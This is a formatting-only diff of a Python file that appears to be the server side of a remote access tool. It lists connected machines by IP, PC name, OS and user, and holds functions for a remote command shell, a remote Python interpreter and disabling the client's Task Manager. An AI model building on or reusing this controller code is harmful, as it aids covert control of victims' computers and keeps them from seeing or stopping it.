@@ -141,8 +141,10 @@ def close():
     for _, conn in enumerate(arrConnections):
         conn.send(str.encode("exit"))
         conn.close()
-    del arrConnections; arrConnections = []
-    del arrAddresses; arrAddresses = []
+    del arrConnections
+    arrConnections = []
+    del arrAddresses
+    arrAddresses = []
 
 
 def refresh_connections():  # used to remove any lost connections
@@ -167,15 +169,15 @@ def list_connections():
     for intCounter, arrAddress in enumerate(arrAddresses):
         strClients += str(intCounter)
         for value in arrAddress:
-            strClients += f"{4*' '}{str(value)}"
+            strClients += f"{4 * ' '}{str(value)}"
         strClients += "\n"
 
-    strInfo = f"\nID{3*' '}"
+    strInfo = f"\nID{3 * ' '}"
     for index, text in enumerate(["IP", "Port", "PC Name", "OS", "User"]):
-        strInfo += center(str(arrAddresses[0][index]), text) + 4*" "
+        strInfo += center(str(arrAddresses[0][index]), text) + 4 * " "
     strInfo += f"\n{strClients}"
     print(strInfo, end='')
-    
+
 
 def select_connection(connection_id, blnGetResponse):
     global conn, arrInfo
@@ -351,6 +353,7 @@ def command_shell():  # remote cmd shell
         else:
             print(strDefault, end="")
 
+
 def python_interpreter():
     send(str.encode("python"))
     recv(intBuff)
@@ -366,6 +369,7 @@ def python_interpreter():
             print(strReceived)
     send(str.encode("exit"))
     recv(intBuff)
+
 
 def disable_taskmgr():
     send(str.encode("dtaskmgr"))
@@ -400,7 +404,7 @@ def send_command(command):
     send(str.encode("runcmd" + command))
     intBuffer = int(decode_utf8(recv(intBuff)))  # receive buffer size
 
-    strClientResponse = f"{24*'='}\n{arrInfo[0]}{4*' '}{arrInfo[1]}{decode_utf8(recvall(intBuffer))}{24*'='}"
+    strClientResponse = f"{24 * '='}\n{arrInfo[0]}{4 * ' '}{arrInfo[1]}{decode_utf8(recvall(intBuffer))}{24 * '='}"
 
     if os.path.isfile("command_log.txt"):
         strMode = "a"
@@ -524,6 +528,7 @@ def create_jobs():
     for intThread in arrJobs:
         queue.put(intThread)  # put thread id into list
     queue.join()
+
 
 create_threads()
 create_jobs()
